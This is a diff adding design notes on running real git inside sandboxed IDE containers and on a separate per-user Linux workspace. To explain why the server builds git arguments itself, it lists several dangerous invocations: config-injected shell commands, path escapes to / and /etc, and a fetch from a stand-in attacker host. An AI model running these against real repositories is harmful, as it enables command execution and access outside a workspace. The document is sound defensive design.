@@ -90,6 +90,73 @@ the thing to preserve when it is built is the mount rule above: a workspace that
 could see every project the user owns would turn one compromised dependency into
 access to all of their work.
 
+## Real Git
+
+`git` — the program, in the container, against the project's actual files. Not a
+reimplementation: the repository the terminal sees and the repository the UI
+sees are the same repository, so a `git checkout` typed in a shell and one
+clicked in the IDE cannot disagree.
+
+**The client never sends an argument vector.** `src/git.ts` exposes typed
+operations and builds every argv itself, and that is the security design rather
+than a detail of it. A subcommand allowlist would not be enough, because git's
+*options* are the dangerous part:
+
+```
+git -c core.sshCommand=…  fetch     arbitrary command execution
+git -c alias.x='!sh' x              the same, spelled differently
+git --git-dir=/ --work-tree=/ …     any path on the host side of the mount
+git -C /etc status                  outside the workspace entirely
+git fetch https://attacker.example  an outbound request of the caller's choosing
+```
+
+None of those can be expressed. Paths are the only free-form input; they go
+through `normalizePath` and are passed after `--`, so a file called
+`--upload-pack` is a filename. Git also runs with `GIT_TERMINAL_PROMPT=0`,
+`GIT_CONFIG_NOSYSTEM=1`, an empty `GIT_ASKPASS` and `GIT_PAGER=cat`, so no
+configuration or helper on the image can turn a read into an execution.
+
+**Supported:** `init`, `status`, `add`, `unstage`, `commit`, `log`, `diff`,
+`branch` list and create, `switch`/`checkout`, `show`, `rev-parse`, `remote`
+list, `restore` (discard), `branch -d`.
+
+**Not supported, and not by omission:** `fetch`, `pull`, `push`, `clone`, and
+`remote add`. The container runs with `--network none`, and the way to make
+those work is not to remove that. GitHub already has a credential path — an Edge
+Function holding the token server-side, never in a container, a workspace, a git
+config or the browser — and that path stays where it is. A workspace that could
+reach the network with a token in it would be both an SSRF primitive and a place
+a credential lives; neither is worth `git push` from a shell.
+
+**Destructive operations are refused, not confirmed away.** `checkout`,
+`discard` and `branch -d` ask what would be lost first and refuse unless the
+caller explicitly confirms; the refusal names the files. `branch -D` is not
+offered at all — git's refusal to delete unmerged work is the safety property,
+and a force flag exists to remove it.
+
+## The Linux Workspace
+
+A second workspace concept, and deliberately not a second terminal setting.
+
+|  | Project Terminal | Project (Linux) | Linux workspace |
+|---|---|---|---|
+| Runs | in the browser | in a container | in a container |
+| Scope | the open project | the open project | the person |
+| Files | the project's VFS | the project, synchronised | its own, starts empty |
+| Authorised by | the app | project membership (editor) | identity alone |
+| Real git | no | yes | yes |
+
+A Linux workspace mounts no project, starts empty, and is keyed by
+`(user, 'linux')` — the kind is part of the container id, so a project that
+happens to be called `linux` cannot collide with one. Project membership grants
+no access to it, and losing project access does not close it, because it was
+never a project's.
+
+Files cross only through an explicit transfer: a person names files and a
+direction, both endpoints are authorised independently by owner, protected paths
+never travel, symlinks are not followed on either side, and an existing
+destination is reported as a conflict rather than overwritten.
+
 ## Workspace migration
 
 The container id changed from a 32-bit FNV-1a to a 128-bit SHA-256, because the
